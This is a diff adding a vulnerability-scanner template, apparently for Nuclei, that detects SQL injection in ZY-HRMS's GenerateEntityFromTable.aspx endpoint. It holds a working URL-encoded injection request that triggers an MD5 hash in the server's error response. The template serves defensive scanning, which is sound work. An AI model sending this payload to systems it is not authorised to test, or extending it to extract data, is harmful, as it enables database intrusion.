@@ -1,0 +1,26 @@
+id: zyehr-sql-injection
+info:
+  name: ZY-HRMS GenerateEntityFromTable.aspx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    ZY-HRMS, a cross-platform attendance system, has a SQL injection vulnerability in the `GenerateEntityFromTable.aspx` endpoint. Exploiting this vulnerability can allow attackers to gain database privileges and potentially escalate to server system access.
+  tags: sql-injection
+  reference:
+    - https://fofa.so/
+
+http:
+  - raw:
+      - |
+        GET /resource/utils/GenerateEntityFromTable.aspx?t=1%27%2B(SELECT%20CHAR(103)%2BCHAR(87)%2BCHAR(114)%2BCHAR(112)%20WHERE%201669%3D1669%20AND%206492%20IN%20(select%20SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27,%271230%27)),3,32)))%2B%27 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "4122cb13c7a474c1976c9706ae36521d"
